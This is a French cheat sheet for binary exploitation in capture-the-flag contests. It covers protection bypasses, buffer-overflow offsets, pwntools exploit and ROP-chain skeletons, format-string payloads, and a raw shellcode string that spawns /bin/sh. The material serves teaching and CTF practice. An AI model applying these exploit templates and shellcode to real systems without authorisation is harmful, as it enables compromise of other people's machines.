# 💥 Fiche pratique d’exploitation binaire (pwn) pour les CTF

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Pwn-CTF.tr.md) • [🇬🇷 Ελληνικά](Pwn-CTF.el.md)

---

## 🔍 Analyse initiale

```bash
# Vérifier les protections
checksec binary

# Informations sur le fichier
file binary
ldd binary        # Bibliothèques

# Exécuter le binaire
./binary
ltrace ./binary   # Appels de bibliothèques
strace ./binary   # Appels système
```

---

## 🛡️ Protections

| Protection | Description | Contournement |
|------------|-------------|--------|
| **NX** | Pile non exécutable | ROP |
| **ASLR** | Adresses aléatoires | Fuite d’adresse puis calcul |
| **PIE** | Adresse de base du binaire aléatoire | Obtenir une fuite d’adresse du binaire |
| **Canary** | Valeur sentinelle protégeant la pile | Obtenir une fuite de la sentinelle |
| **RELRO** | Protection de la GOT | Utiliser d’autres techniques |

---

## 📏 Débordement de tampon (buffer overflow)

### Déterminer le décalage (offset)
```bash
# Avec pwntools
cyclic 200        # Générer un motif
cyclic -l 0x6161616a  # Déterminer le décalage

# Avec GDB
pattern create 200
pattern offset 0x6161616a
```

### Exploit élémentaire avec pwntools
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Adresse de retour

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP (Return Oriented Programming)

La programmation orientée retours enchaîne de courts fragments de code existant, appelés gadgets.

### Rechercher des gadgets
```bash
ROPgadget --binary binary
ropper -f binary

# Gadgets courants
pop rdi; ret
pop rsi; pop r15; ret
ret                  # Pour l’alignement de la pile
```

### Chaîne ROP avec pwntools
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Construire la chaîne
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

## 🐚 Shellcode

Un shellcode est un fragment de code machine utilisé comme charge utile.

### Linux 64 bits

> **Précision :** les extraits sont des squelettes : adresses, décalages et symboles dépendent du binaire. La génération de shellcode dépend du [contexte d’architecture pwntools](https://docs.pwntools.com/en/stable/context.html) ; le titre « 64 bits » ne configure pas à lui seul ce contexte. Les commandes `pattern` dépendent aussi de l’extension GDB installée.
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# Manuellement
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 Vulnérabilités de chaînes de format (format string)

```bash
# Obtenir une fuite de valeurs
%p %p %p %p %p
%x %x %x %x %x

# Écrire
%n - écrire le nombre d’octets affichés
%hhn - écrire un octet
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

## 🛠️ Outils

| Outil | Utilité |
|------|-----|
| **pwntools** | Bibliothèque Python pour l’exploitation binaire |
| **GDB + GEF** | Débogage |
| **ROPgadget** | Recherche de gadgets ROP |
| **one_gadget** | Recherche de gadgets one-shot dans la libc |
| **checksec** | Vérification des protections |

---

## 📋 Liste de contrôle d’exploitation binaire

```markdown
□ checksec binary
□ Trouver une vulnérabilité (débordement, chaîne de format)
□ Calculer le décalage
□ Vérifier les protections
□ Construire l’exploit (shellcode/ROP)
□ Tester en local
□ Adapter l’exploit à la cible distante
```

---

**Retour aux CTF :** [🏁 Vue d’ensemble des CTF](./README.fr.md)
